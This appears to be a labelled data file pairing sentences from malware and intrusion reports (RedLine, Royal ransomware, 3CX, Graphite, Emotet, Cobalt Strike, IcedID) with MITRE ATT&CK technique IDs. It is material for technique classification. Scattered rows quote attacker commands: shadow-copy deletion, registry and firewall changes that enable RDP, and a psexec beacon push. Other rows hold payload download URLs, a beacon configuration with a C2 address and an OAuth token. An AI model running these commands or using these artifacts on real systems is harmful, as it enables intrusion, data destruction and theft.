"Disable Windows update services such as (“wuauserv”, “WaaSMedicSvc”, “UsoSvc”)",T1562.001
Disable Automatic Update and change Windows configurations related to Windows Update Figure 4 RedLine Stealer Deep Dive C2 Connection Check RedLine Stealer is designed to be stealthy and avoid detection by security software.,T1562.001
"Therefore, it typically starts by decrypting its initial configuration data, which is often encoded or encrypted to prevent detection.","T1027, T1140"
It starts its code by decrypting its initial configuration that the malware needs to connect to its Command and Control (C2) server and receive instructions on how to operate.,T1140
Figure 5 shows the code of the decryption algorithm used by RedLine Stealer to decrypt its initial configuration data which is a combination of Base64 and XOR functions.,"T1027, T1140"
"Figure 5 Once the initial configuration data has been decrypted, it will constantly check its bind connection to its C2 server to download further command arguments or other configuration settings that will dictate what functionality will be enabled for its malicious client file.",T1140
Figure 7 RedLine Capabilities RedLine Stealer has several features that will be executed depending on the configuration setting it downloaded from its C2 to steal information from the compromised or targeted host.,T1005
"Figure 8 Gather System Information As stated earlier, RedLine Stealer has the ability to collect or extract various types of system information from a targeted or compromised computer.",T1082
"Function name (renamed) Description func_GetHostSerialNumber() Retrieve the user domain name, username and host serial number (without “-”) and convert it into a MD5 hash func_GetExecutingAssembly() Get the full file path of its running malware sample func_GetLanguageTimeZoneOsVersion() Retrieves system default language, timezone and OS version func_GetUserName() Get the user name of the compromised host func_GetProcessor() Get processor information of the compromised host by executing ""SELECT * FROM Win32_Processor"" func_GetGraphicCards() Get AdapterRAM and Graphic Card Name and type by executing ""root\\CIMV2"", ""SELECT *","T1033, T1082"
"FROM Win32_VideoController"" func_GetBrowsers() Parse browser application and browser version installed in the compromised host by querying ""SOFTWARE\WOW6432Node\Clients\StartMenuInternet"" or ""SOFTWARE\Clients\StartMenuInternet"" registry func_GetTotalRAM() Get the total RAM size of compromised host by executing ""SELECT * FROM Win32_OperatingSystem"" and look for ""TotalVisibleMemorySize"" func_ListPrograms() Parse all installed application in the compromised host by querying 'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall' registry func_GetFirewalls() Parse firewall and Anti Virus Product install in the compromised host by running ""SELECT * FROM ROOT\\SecurityCenter2"" ""SELECT * FROM ROOT\\SecurityCenter"" ""SELECT *","T1012, T1518.001, T1082"
"FROM AntivirusProduct"" ""SELECT *",T1518.001
"FROM FirewallProduct"" ""SELECT * FROM AntiSpyWareProduct"" func_ListProcesses() Retrieve process list and process information by running 'SELECT *","T1057, T1518.001"
"FROM Win32_Process' func_AvailableLanguage() Get the install input language Screen Capture Based on one of the RedLine samples we analyzed, we saw that it has a functionality to capture a screenshot of the targeted or compromised host as part of its data collection and exfiltration.","T1057, T1113"
"In Figure 9 above, the function we’ve renamed as func_ScanScreen() is the one responsible for this screen capture capability.",T1113
RedLine uses .NET,"T1106, T1113"
Graphics class CopyFromScreen,"T1106, T1113"
Function() to transfer a bit block of color data from the screen to the Graphic drawing surface that will be saved in memory stream for data exfiltration.,"T1106, T1113"
"Figure 9 Cracking Browser Password One of the powerful capabilities of this Trojan Stealer is cracking browser sensitive information like passwords, cookies, autofill and credit card information saved within the browser application.",T1110
Afterward it will read the copied “Local State” file to grab the encoded and encrypted master key to decrypt the password stored in the “Login Data”.,"T1027, T1140"
The master key is encoded with Base64 and encrypted using Windows CryptProtectData() API.,"T1027, T1106, T1140"
"Once the master key is decrypted, it will parse the AES IV (Initialization vector) and the encrypted password in the copied “Login Data” database file to decrypt it using AES GCM algorithm.","T1027, T1140"
The decrypted password will be sent to its C2 Server as part of its data exfiltration.,"T1041, T1140"
Figure 11 shows the RedLine Stealer code and how it enumerates several known Crypto Wallet directories and looks for files related to crypto currencies by looking for files having “wallet” substring on its file name.,T1083
"When contacted, they will use social engineering tactics to lure victims into installing remote access software. Figure 2.",T1219
"Royal ransomware’s attack flow Installation Our investigation found that the ransomware actors used a compiled remote desktop malware, which was used to drop the tools they needed to infiltrate the victim’s system: they used QakBot and Cobalt Strike for lateral movement, while NetScan was used to look for any remote systems connected to the network.",T1021.001
"Once they infiltrated the system, the ransomware actors used tools such as PCHunter, PowerTool, GMER, and Process Hacker to disable any security-related services running in the system.",T1562.001
"We also observed an instance in which they used AdFind to look for active directories, then executed RDPEnable on the infected machine.",T1021.001
There were also instances of the malware actors using PsEXEC to enable the remote desktop protocol (RDP) of a target system before executing the ransomware.,T1021.001
"Checking if length of provided “-id” is 32 bytes It enumerates files and directories for encryption using FindFirstFileW, FindNextFileW, and FindClose APIs (Figure 5).","T1083, T1106"
"File enumeration The ransomware looks for available network shares for network encryption by listing accessible local IPs, then uses NetShareEnum and attempts to connect on ADMIN$ and IPC$ shares (Figure 6).","T1083, T1016"
"Looking for accessible local IPs then trying to connect to ADMIN$ and IPC$ It checks for the number of processors in the infected system and uses it as a base for the concurrent running threads for file encryption, as shown in Figure 7.",T1082
Checking the number of processors Royal ransomware inhibits system recovery by deleting shadow copies (Figure 8) through the following command: C:\\Windows\\System32\\vssadmin.exe delete shadows /all,T1082
"Encrypted files appended with the “.royal” extension For each directory it traverses, Royal ransomware drops a text file named “README.TXT” that contains the ransom note (Figure 16), as well as an advertisement for its “pentesting services” that the ransomware actors will allegedly provide once the ransom has been paid (Figure 17).",T1083
title: Threat Advisory: 3CX Softphone Supply Chain Compromise url: https://blog.talosintelligence.com/3cx-softphone-supply-chain-compromise/ Cisco Talos is tracking and actively responding to a supply chain attack involving the 3CX Desktop Softphone application.,T1574.002
"This is a multi-stage attack that involves sideloading DLLs, seven-day sleep routines, and additional payloads dependent on a now-removed GitHub repository for Windows-based systems.",T1574.002
The infection chain consists of several stages and involves sideloading DLLs along with a seven-day sleep cycle before the malware attempts to retrieve additional malicious artifacts from a now-removed GitHub repository for the Windows based infection.,"T1574.002, T1105"
The GitHub repository hosted a series of icon files with encrypted data appended to the end of the files.,T1027
"These encrypted strings, once decrypted, contained the C2 domains for additional malicious artifacts.","T1027, T1140"
The MacOS version used a hard coded C2 domain.,T1140
"These second-stage payloads are information stealers that attempt to obtain system information and the latest browsing history records, indicating this information may be used as a filtering mechanism to identify and discard some victims while maintaining unauthorized access to others.",T1082
"To find this image, it iterates through all the Shape objects in the document and deletes the one with the same name.",T1027
"To hide the strings it uses during its execution, it primarily uses a simple encoding by subtracting 35 from each character of the original string and encoding the result with Base64.",T1027
That node contains the encoded payload.,T1027
Below is a screenshot of the encoded payload stored in “customXml\item1.xml” of the document archive (Figure 4).,T1027
"Figure 4: Encoded binary payload Although the payload in this document is stored in a single node, the VBA code also supports an encoded payload split across several nodes, further complicating its extraction.",T1027
"Similar to decoding strings, the binary payload is extracted by decoding the data using Base64 and adding 35.",T1140
"Only this time, the resulting bytes are further decoded with xor 82.",T1140
The decoded payload is a 64-bit executable (.exe).,T1140
"Figure 5: Comparison of code in document vs. blog Once the payload is decoded, it is written to the hardcoded path “C:\Users\user\AppData\Local\Microsoft\Office\OfficeTelemetry.dll” and executed using ShellExecute with the following command line:","T1059.003, T1140"
"Figure 7: Functions exported by OfficeTelemetry.dll Upon execution, it locates a packed and compressed payload in the .vdata section (Figure 8) of the memory allocated for the current process.",T1027
Figure 8: Encrypted and compressed payload in .vdata section,T1027
"Compressed size (4 bytes) 6. Offset 0x4e: Uncompressed size (4 bytes) 7. Offset 0x52: Loader configuration string length (2 bytes) 8. Offset 0x154: Start of encrypted and compressed loader configuration and payload After decrypting and decompressing the payload, we see a pipe-delimited configuration followed by the actual shellcode to be executed (Figure 9).","T1027, T1140"
Figure 9: Decrypted and decompressed payload The loader configuration format is as follows: Field 1: Injection type: Current process (1) or in the new process (2) Field 2: Flag to wait for injection thread to terminate before terminating loader (injection type 1 only),"T1055, T1140"
Field 3: Process to inject into (injection type 2 only),T1055
Field 4: Process to inject into (injection type 2 only),T1055
"Field 5: Flag to write empty file to %TEMP% upon successful injection Field 6: Wait timeout used for Windows events within the code Field 7: Unknown flag used (injection type 1 only) Field 8: Flag to enable sleep obfuscation after creating an injected thread (injection type 1 only) Field 9: Flag to enable sleep obfuscation via a separate thread Field 10: Flag to enable sleep obfuscation Field 11: Flag to patch APIs After parsing the configuration, this loader prepends a stub containing 79 bytes of junk instructions before the actual payload shellcode.",T1027
The bytes at 25 hardcoded offsets within this stub are replaced with random bytes to hinder shellcode detection.,T1027
"Hence, the payload will only be executed up to 8 times per day.",T1055
"To launch the shellcode, the loader calls ZwCreateThreadEx to create a new suspended injection thread hidden from debuggers using the THREAD_CREATE_FLAGS_CREATE_SUSPENDED (0x01) and THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER (0x4) thread creation flags.",T1055
It does this by redirecting calls to the Windows Sleep API to its own function that performs the following: 1. Suspends all threads in the current process,T1106
Reverts patches to security APIs (only if patching was configured) 4. Encodes sensitive memory regions in the current process with a randomized XOR key 5. Calls Sleep with the specified timeout 6.,T1140
Decodes sensitive memory regions in the current process with the same XOR key 7. Patches security-related APIs to disable them 8.,T1140
Demon communicates with the C2 server specified in the configuration via HTTP or HTTPS POST requests.,T1071.001
A randomized 256-bit key and 128-bit IV are generated and shared with the C2 server on the initial check-in request (Figure 11) for encrypting subsequent data communicated between the agent and C2 server with AES-256-CTR. Figure 11:,T1573.001
"Chrome/108.0.0.0 Safari/537.36 URIs:/wp-content/themes/pressa/js/avias.js /wp-content/themes/pressa/js/mobile_menu.js /wp-content/plugins/contact-form-7/includes/js/scripts.js /wp-content/themes/pressa/js/bootstrap.js /wp-content/themes/pressa/js/hovermenu.js /wp-content/themes/pressa/js/retina-1.1.0.js /wp-content/plugins/js_composer/assets/lib/bower/isotope/dist/isotope.pkgd.min.js /wp-content/themes/pressa/js/custom-script.js /wp-includes/js/wp-emoji-release.min.js /maps-api-v3/api/js/52/1/intl/uk_ALL/util.js /wp-includes/js/wp-embed.min.js The major features of Demon include: Enumerate host and network info (users, groups, domains, shares, etc.)",T1059.003
"Execute commands via Command Prompt Execute PowerShell commands Inject and execute DLLs, shellcode, .NET assemblies, Cobalt Strike BOF files Manipulate processes (list, create, search, kill, etc.) Manipulate files and directories (list, download, upload, view, delete, etc.)","T1057, T1070.004, T1105, T1083, T1059.003, T1055"
"Manipulate access tokens (steal, impersonate, etc.) Take screenshots As this Demon sample was unmodified from the version in Github, we will not analyze it in detail here.",T1113
"As a result, customers who have these products with up-to-date protections are protected.",T1566.001
This type of threats is usually delivered as email attachments.,T1566.001
"The lure document is a PowerPoint file that exploits a code execution technique, which is designed to be triggered when the user starts the presentation mode and moves the mouse.",T1204.002
The code execution runs a PowerShell script that downloads and executes a dropper from OneDrive.,T1105
"The latter downloads a payload that extracts and injects in itself a new PE (Portable Executable) file, that the analysis showed to be a variant of a malware family known as Graphite, that uses the Microsoft Graph API and OneDrive for C&C communications.","T1105, T1106, T1055"
"Lure document content This PowerPoint exploits a code execution technique that is triggered by using Hyperlinks instead of Run Program / Macro, which is designed to be triggered when the user starts the presentation mode and moves the mouse.",T1204.002
"The code that is executed is a PowerShell script shown below, which is run through the utility SyncAppvPublishingServer, and performs the download of a file from OneDrive with a JPEG extension (DSC0002.jpeg).",T1105
This in turn is a DLL file that is later decrypted and written to the local path C:\ProgramData\lmapi2.dll.,T1140
PowerShell Script The full URL used to download the DLL is reported below: URL https[:]\\9b5uja[.]am[.]files[.]1drv[.]com/y4mpYJ245I931DUGr7BV-dwLD7SReTqFr1N7eQOKSH_ug2G18Jd6i3SRqYqgugj3FA2JQQ7JqclvWH13Br3B5Ux-F6QcqADr-FowC_9PZi1Aj7uckcK8Uix_7ja1tF6C_8-5xYgm6zwjbXsrlEcTEenAyA8BzEaGPudutl1wMDkzVr6Wmn8_qRmYejLgbNoQmPTUe3P5NKFFLRjeeU_JhvA/DSC0002.jpeg?download,T1112
The execution triggers the setting of the following registry key with the value C:\ProgramData\lmapi2.dll to achieve persistence.,T1112
REG KEY HKCU\Software\Classes\CLSID\{2735412E-7F64-5B0F-8F00-5D77AFBE261E}\InProcServer32 and the execution of the downloaded DLL via the tool,T1218.011
rundll32.exe.,T1218.011
"If the mutex doesn’t already exists, the malware makes another request to OneDrive using the following URL: URL https[:]//kdmzlw[.]am[.]files[.]1drv[.]com/y4mv4glUgvW9nl8z8GU71PhPw0oRtve9QpZ0pEgwJN1q_TlGY5yl5Mvkrc5rUh0Uxxknlr1qymWyCbPrkKOFgL4CARScSn9UMhq3c5hSNOQsDOamYLmOfN61lUtQO10vxtn0I7QROJdOtQ42wDsaiACGR5ZrmYwt0SmZkphGWQpT2gOFrsUxjg8_7QT01VTABiGr3T6xpWrTmFT5yu4toQ/DSC0001.jpeg?download"" A new file, again with a JPEG extension (DSC0001.jpeg), is downloaded and decrypted using the RSA and AES Cryptographic Provider from WinCrypt APIs, with a hardcoded public key.","T1027, T1106, T1140"
"Then, the malware dynamically calls the API NtAllocateVirtualMemory and then writes and executes the decrypted content in the newly allocated memory region.","T1106, T1140"
"Similarly, the imported code dynamically calls VirtualAlloc to allocate a new region of memory in which a new PE file is copied.",T1055
"Finally, it passes the execution to the region of memory in which the copied PE is allocated, as evidence reported following: The code in the injected PE creates another mutex having the name 42Htb600y.",T1055
The malware proceeds to de-obfuscate strings using a XOR loop and using a different XOR key for each string.,T1140
"The following is an exhaustive list of de-obfuscated strings: DE-OBFUSCATED STRINGS \\.\root\CIMV2SELECT UUID FROM Win32_ComputerSystemProduct""WQL”L""UUID”""Unknown CLR”L""pwrshplugin.dll”L""kernel32.dll”""RtlGetVersion”""RtlRandomEx”""RtlIntegerToUnicodeString”""RtlDecompressBuffer”""RtlGetCompressionWorkSpaceSize”""RtlCompressBuffer”""RtlComputeCrc32”""Windows 2000”""Windows XP”""Windows XP Professional”""Windows Server 2003”""Windows",T1140
"The malware communicates with the Command and Control (C&C) through the domain graph[.]Microsoft[.]com, i.e. abusing the Microsoft Graph service, which is the API Web RESTful that provides access to Microsoft Cloud service resources.",T1106
"Hence, the analysis showed that the sample in question is a version of the Graphite malware, a malware using the Microsoft Graph API and OneDrive for C&C communications.",T1106
"To obtain a new OAuth2 token to access the service, the endpoint login[.]microsoftonline[.]com/common/oauth2/v2.0/token is contacted using a fixed client ID (62272a08-fe9d-4825-bc65-203842ff92bc), as evidence below: The following is the full HTTP request to make the first connection to the C&C. HTTP REQUEST POST https://login.microsoftonline.com/common/oauth2/v2.0/token HTTP/1.1User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET",T1071.001
"CLR 3.5.30729)Content-Type: application/x-www-form-urlencodedHost: login.microsoftonline.comContent-Length: 459Connection: Keep-AliveCache-Control: no-cacheclient_id=62272a08-fe9d-4825-bc65-203842ff92bc&redirect_uri=urn:ietf:wg:oauth:2.0:oob&refresh_token=M.R3_BAY.-CVmbPSAFzt2n5JiYAwjQRpC6Yh*f45Zsz9XKTHMo4G1ZeR0UDVRbJhp8T7Df*ARh8tTfRKRZZ8YzFEYMRJ!VPP!GJPZsfeTb0SMIF!gXQ0sUli*gTjLrdaTxOnwndJcUIqtbY8D8ZCFI4lC3pEE3KW7ED!svw*kKb1rojgehD1Sa70lDuVa86awTeZrh8lyBh9m9vdudqoqVNLyRpLyHd*di1s2G6ub9MjH9BVoDVrDaqmJvUsMonxqqhqx!iwwU1ptzd1WngCv9BCmVtxgFTJBPR1bJ2Ze17e0N6W3VHZC2FQOOUhu4nQ2Wrj0qLEBowQ$$&grant_type=refresh_token Once obtained a new OAuth2 token, the Graphite malware will query the Microsoft GraphAPIs for new commands by enumerating the child files in the check OneDrive subdirectory.",T1083
"If a new file is found, the content is downloaded and decrypted through an AES-256-CBCdecryption algorithm.",T1140
The attack starts with a .img container (1) and a social engineering technique of displaying a single file once it’s mounted while hiding the rest of its files from the user.,T1564.001
Figure 1: Campaign execution stages,T1204.002
The user is then prompted to open the single visible shortcut (2) file.,T1204.002
"FIgure 2: Contents of the .img file, including the hidden files",T1564.001
The only purpose of the script is to run the subsequent BAT scripts.,T1059.003
Some variants used a known UAC bypass method abusing the legitimate fodhelper.exe (3.1).,T1548.002
This enables the attacker’s BAT file to run in a new elevated process without the user’s approval.,T1059.003
Figure 3: UAC bypass implementation.,"T1059.003, T1548.002"
The BAT script (4) does several things: 1. Changes the password of the logged-in user.,T1059.003
b. Register a new service that will run its VBS script (4.1) using sc.exe.,"T1543.003, T1569.002"
5.,T1112
"If it fails, it sets in the registry a BAT file (4.2) to be run on logon as another UI shell by Winlogon.","T1059.003, T1112"
The script that runs after boot executes another BAT script (4.3) to extract the ransomware payload.,T1059.003
It uses the 7-zip archiver and then runs it with a ‘-pass’ argument that is needed for the malicious executable to unpack itself.,T1027
Figure 5: Command inside BAT script (4.3) decrypting and running the ransomware The final payload is LockBit.,T1140
"Multi-stage scripts that extract a password-protected ransomware executable, which is unpacked only when run with a unique password, allow evading traditional signature-based detection.",T1027
This 1st-stage attack takes advantage of the way macOS registers document handlers and custom URL schemes to automatically unzip a malicious attachment sent via phishing emails in the Safari browser.,T1566.001
Researchers at ASERT have observed a new campaign targeting institutions in Romania and Russia utilizing spear phishing emails pretending to be from financial vendors or partners to trick users into opening the malicious attachments in the emails.,"T1566.001, T1204.002"
The malicious attachments are either a Word document that contains obfuscated VBA scripts or a binary with a JPG extension.,T1027
Both send information to command and control (C2) servers that are owned by Cobalt Group.,T1041
"Whilst the malware is not too sophisticated, it does have a broad range of commands that it can do, including keylogging every tap, exfiltrate data from messaging applications such as WhatsApp and Viber, and bypasses the Doze battery saver.","T1005, T1056.001"
The malware can deliver payloads from the command and control (C2) server which originates from a free Russian web hosting service called Ucoz.,T1105
The emails have targeted corporate businesses using three possible types of messages to try to get a target to open the email and malicious attachment.,"T1566.001, T1204.002"
"If a target opens the malicious attachment, the Loki Bot malware then can assist in the threat actors gaining access to intellectual property, databases, bank account information, system credentials and more.","T1566.001, T1204.002"
This vulnerability allows for a threat actor to obtain system privileges and currently has no known workarounds for the vulnerability.,T1068
Security researcher Vishal Thakur has discovered a malware campaign that sends emails pretending to be related to a shipment notice for the target which contain a malicious attachment.,T1566.001
"The attachment, if opened, contains a DarkComet Remote Access Trojan (RAT).",T1204.002
"DarkComet then allows for threat actors to obtain logs of the infected machine’s keystrokes, application use, and take screenshots, amongst other things.","T1113, T1056.001"
"This version of CEIDPageLock has VMProtect, which makes analysis and unpacking difficult and also redirects victims to the specific homepage when they attempt to access specific Chinese websites.",T1027
"After executing the Emotet malware, it ran a few basic Windows discovery commands (systeminfo, ipconfig, etc.), wrote a registry run key for persistence, and made its initial call outs to the command and control servers.","T1016, T1059.003, T1547.001, T1082"
This entailed connecting to various email servers and sending new emails with attached xls and zip files.,T1566.001
"Around 26 hours after the initial infection, while still running the email spreader, the Emotet malware pulled down and executed a Cobalt Strike payload on the beachhead host.",T1105
"Right after the beacon was executed, the threat actors began enumerating the network using native Windows binaries and the PowerView module, Invoke-ShareFinder.",T1059.003
Around 30 minutes after dropping the beacon the threat actor injected into a dllhost.exe process and then proceeded to dump credentials from LSASS.,"T1003.001, T1055"
This was achieved by transferring a Cobalt Strike DLL over SMB and executing via a remote service on another workstation.,"T1570, T1569.002"
"From there, they ran Invoke-Sharefinder once again, along with AdFind, using a batch file named find.bat.",T1059.003
The threat actors then proceeded to do additional network discovery using a batch script named p.bat to ping all servers in the network.,T1059.003
"Once on the Domain Controller, the threat actors again used Get-System to elevate and then dumped LSASS.",T1003.001
"Once again, they executed Invoke-Sharefinder, AdFind, and the p.bat batch script to ping online servers.",T1059.003
"Using the remote admin tools, they used Rclone to exfiltrate important data from a file server and upload it to MEGA.",T1219
The threat actor gained access to the environment after a user opened an Excel document and enabled macros.,T1204.002
The document came in via email in the form of a zip file which included an xls file.,T1566.001
"The document contains hidden sheets, has white characters on a white background, and is attributed to SilentBuilder with Emotet, epoch5.",T1140
To deobfuscate the document the tool xlmdeobfuscator was used with the following output.,T1140
"After deobfuscation and cleaned up, the code in the macro looks as follows.",T1140
"Cobalt Strike Execution The Emotet DLL is then used to download Cobalt Strike, which is then injected into svchost and dllhost.",T1055
Persistence The Emotet malware infection on the beachhead host used a registry run key to maintain persistence.,T1547.001
"Beyond the beachhead host, the threat actor deployed several Atera/Splashtop remote access tools across the environment as an alternative means of access to the environment should they lose access to their Cobalt Strike beacons.",T1219
Defense Evasion Process injection was observed during the intrusion by both Emotet and Cobalt Strike.,T1055
Cobalt Strike used process hollowing to launch under the context of the Dllhost.exe process.,T1055
"We later saw Dllhost.exe injecting into multiple other processes, such as explorer.exe and svchost.exe, to execute further payloads.",T1055
Scanning process memory across affected hosts reveals both the direct Cobalt Strike processes and the injected processes using the Malpedia yara rule.,T1055
-s LSM win_cobalt_strike_auto 9308 regsvr32.exe regsvr32 C:\ProgramData\1.dll win_cobalt_strike_auto 1056 svchost.exe C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p win_cobalt_strike_auto 1428 svchost.exe C:\Windows\system32\svchost.exe -k ICService -p win_cobalt_strike_auto 6036 regsvr32.exe regsvr32 C:\ProgramData\1.dll win_cobalt_strike_auto Credential Access From the beachhead host credentials appear to have been dumped from an injection into the SearchIndexer process on the host.,T1055
"We observed Cobalt Strike beacons accessing LSASS on multiple occasions, on almost every compromised host.",T1003.001
"Discovery On the first day of the intrusion, the Emotet malware performed some basic discovery tasks on the host using built in Windows utilities.","T1059.003, T1082"
systeminfo ipconfig /all,"T1016, T1082"
"On the second day, the hands on activity from Cobalt Strike performed a more thorough examination of that host’s Windows domain.",T1059.003
C:\Windows\system32\cmd.exe /C,T1059.003
"net group ""Domain Computers"" /domain C:\Windows\system32\cmd.exe /C",T1059.003
"""Domain Admins"" C:\Windows\system32\cmd.exe /C",T1059.003
"""Enterprise Admins"" C:\Windows\system32\cmd.exe /C","T1059.003, T1082"
systeminfo C:\Windows\system32\cmd.exe /C,"T1059.003, T1082"
net users C:\Windows\system32\cmd.exe /C,T1059.003
"AdFind.exe, the command-line Active Directory query tool, was run on only one of the compromised hosts via the find.bat batch script.",T1059.003
"The contents of the script are below: find.exe -f ""(objectcategory=person)"" > ad_users.txt find.exe -f ""objectcategory=computer"" > ad_computers.txt find.exe -f ""(objectcategory=organizationalUnit)"" > ad_ous.txt find.exe -sc trustdmp > trustdmp.txt find.exe -subnets -f (objectCategory=subnet)> subnets.txt find.exe -f ""(objectcategory=group)"" > ad_group.txt find.exe -gcb -sc trustdmp > trustdmp.txt echo end Using the data collected from previous activity, they created a target list which was then fed to a batch script named p.bat.",T1059.003
"The batch file contained one line, which pinged a list of servers (servers.txt).",T1059.003
"i -n 1 >> res.txt Additionally, the threat actors displayed the share directories using dir.exe via the interactive shell from the Cobalt Strike beacon.",T1059.003
"Example: Below, the network traffic shows the SMB lateral transfer of one of the Atera Agent MSI installers (1.msi) used to gain access laterally on a host and provide persistence for later access.",T1570
"Command and Control Emotet In the Emotet Excel document, the following URLs are hard coded, and obfuscated, to download the second stage.","T1027, T1105"
"72a589da586844d7f0818ce684948eea JA3S: f176ba63b4d68e576b5ba345bec2c7b7 Certificate: [66:f7:4c:f9:56:5d:fe:15:a6:8c:62:b9:3d:72:cb:8e:c9:e9:89:02] Not Before: 2022/05/19 12:22:46 UTC Not After: 2023/05/19 12:22:46 (UTC) Issuer Org: jQuery Subject Common: jquery.com { ""beacontype"": [ ""HTTP"" ], ""sleeptime"": 45000, ""jitter"": 37, ""maxgetsize"": 1403644, ""spawnto"": ""AAAAAAAAAAAAAAAAAAAAAA=="", ""license_id"": 206546002, ""cfg_caution"": false, ""kill_date"": null, ""server"": { ""hostname"": ""59.95.98.204"", ""port"": 8080, ""publickey"": ""MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCfWiK6EPk2D2Ho7CBgdUfK2kqa/1x2L0Tt0R4Pl/Sof+7skIOqclxG1PeQTbc0VYagoqiuCJCn/QQd8pJBzci5GMTtdrzcKqZXQBy3Rv7Sfv9v8MZQfU2UVrRgVChdAetwPDdSMAa5tsNhEKBDfpbpmhmXsjN10rW6mfPYu+kzuwIDAQABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=="" }, ""host_header"": """", ""useragent_header"": null, ""http-get"": { ""uri"": ""/jquery-3.3.1.min.js"", ""verb"": ""GET"", ""client"": { ""headers"": null, ""metadata"": null }, ""server"": { ""output"": [ ""print"", ""append 1522 characters"", ""prepend 84 characters"", ""prepend 3931 characters"", ""base64url"", ""mask"" ] } }, ""http-post"": { ""uri"": ""/jquery-3.3.2.min.js"", ""verb"": ""POST"", ""client"": { ""headers"": null, ""id"": null, ""output"": null } }, ""tcp_frame_header"": ""AAWAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="", ""crypto_scheme"": 0, ""proxy"": { ""type"": null, ""username"": null, ""password"": null, ""behavior"": ""Use IE settings"" }, ""http_post_chunk"": 0, ""uses_cookies"": true, ""post-ex"": { ""spawnto_x86"": ""%windir%\\syswow64\\dllhost.exe"", ""spawnto_x64"": ""%windir%\\sysnative\\dllhost.exe"" }, ""process-inject"": { ""allocator"": ""NtMapViewOfSection"", ""execute"": [ ""CreateThread 'ntdll!RtlUserThreadStart'"", ""CreateThread"", ""NtQueueApcThread-s"", ""CreateRemoteThread"", ""RtlCreateUserThread"" ], ""min_alloc"": 17500, ""startrwx"": false, ""stub"": ""yl5rgAigihmtjA5iEHURzg=="", ""transform-x86"": [ ""prepend '\\x90\\x90'"" ], ""transform-x64"": [ ""prepend '\\x90\\x90'"" ], ""userwx"": false }, ""dns-beacon"": { ""dns_idle"": null, ""dns_sleep"": null, ""maxdns"": null, ""beacon"": null, ""get_A"": null, ""get_AAAA"": null, ""get_TXT"": null, ""put_metadata"": null, ""put_output"": null }, ""pipename"": null, ""smb_frame_header"": ""AAWAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="", ""stage"": { ""cleanup"": true }, ""ssh"": { ""hostname"": null, ""port"": null, ""username"": null, ""password"": null, ""privatekey"": null } } Atera and Splashtop Threat actors used Atera and Splashtop remote access tools on two compromised hosts during the intrusion.",T1219
Marked by bursts of connection to various email servers.,T1566.001
"The emails were sent through various compromised email accounts, propagating additional malicious xls files to further propagate Emotet access.",T1566.001
level: medium tags: - attack.exfiltration - attack.t567.002 https://github.com/The-DFIR-Report/Sigma-Rules/blob/main/potential_smb_dll_lateral_movement.yml title: Potential SMB DLL Lateral Movement id: 8fe1524e-8c97-404c-9dee-090929a315c4 status: Experimental description: Detection of potential us of SMB to transfer DLL's into the ProgramData folder of hosts for purposes of lateral movement.,T1570
"They utilized RDP, PsExec, and Cobalt Strike to move laterally within the environment before executing Conti in memory across all active systems.",T1021.001
"Summary We assess with moderate confidence that the initial vector used by the threat actor was a zip file, which included a malicious JavaScript file, delivered through a phishing campaign.",T1566.001
"After being dormant for over two days, a Cobalt Strike Beacon was dropped and executed on the system infected with IcedID.",T1105
"The threat actors then ran another round of discovery activity with native windows utilities such as nltest.exe, whoami.exe, and net.exe.","T1033, T1059.003"
They then successfully escalated to SYSTEM privileges via Cobalt Strike’s built-in “named pipe impersonation” (GetSystem) functionality.,T1570
The threat actors continued by moving laterally to the domain controllers on the network using SMB to transfer and execute a Cobalt Strike Beacon.,T1570
"After a brief gap of 15 minutes, the threat actors used PsExec, to copy and execute a Cobalt Strike Beacon DLL on most of the systems in the network.",T1570
"Later in the attack, the threat actor was seen establishing RDP connections from the beachhead host to the domain controller and other systems throughout the environment.",T1021.001
"This RDP activity was being proxied through the IcedID process running on that host, to a remote proxy over port 8080.",T1090
"Additionally, in an effort to evade any detection and prevention mechanisms, they disabled Windows Defender via a group policy modification.","T1562.001, T1484.001"
Various attributes including the computer name and the OS version of the compromised system were sent through encoded cookie values.,T1082
IcedID was executed via rundll32.exe and ran command and control over port 443 for the duration of the intrusion.,T1218.011
Additional discovery commands were executed by Cobalt Strike.,"T1033, T1059.003"
cmd.exe /C,"T1059.003, T1112"
whoami /groupscmd.exe /C query sessioncmd.exe /C,T1033
"In order to obtain SYSTEM level privileges, Cobalt Strike’s built-in named piped impersonation (GetSystem) was used: Image: “C:\Windows\System32\cmd.exe” CommandLine: “C:\Windows\system32\cmd.exe /c",T1059.003
"Image: C:\Windows\system32\services.exe TargetObject: HKLM\System\CurrentControlSet\Services\d8d6deb\ImagePath Details: \\HOSTNAME\ADMIN$\d8d6deb.exe After this initial activity, Cobalt Strike was used to enable RDP, and allow it through the firewall, on the domain controllers.","T1059.003, T1021.001, T1112"
"reg add ""hklm\system\currentControlSet\Control\Terminal Server"" /v",T1112
"0x0 /f cmd.exe /C netsh firewall set service type = remotedesktop mode = enable cmd.exe /C netsh firewall set rule group=""remote desktop"" new enable=Yes cmd.exe /C netsh advfirewall set rule group=""remote desktop"" new enable=Yes Following this, the threat actors then copied a Cobalt Strike Beacon DLL to the ADMIN$ share; and then, distributed it throughout the environment using PsExec. cmd.exe /C",T1021.001
"psexec.exe -accepteula -d -s \\<INTERNAL_IP> rundll32.exe C:\windows\192145.dll,StartW From here, RDP connections were established from the beachhead host to systems throughout the environment.",T1021.001
The connections were proxied through the IcedID process.,T1090
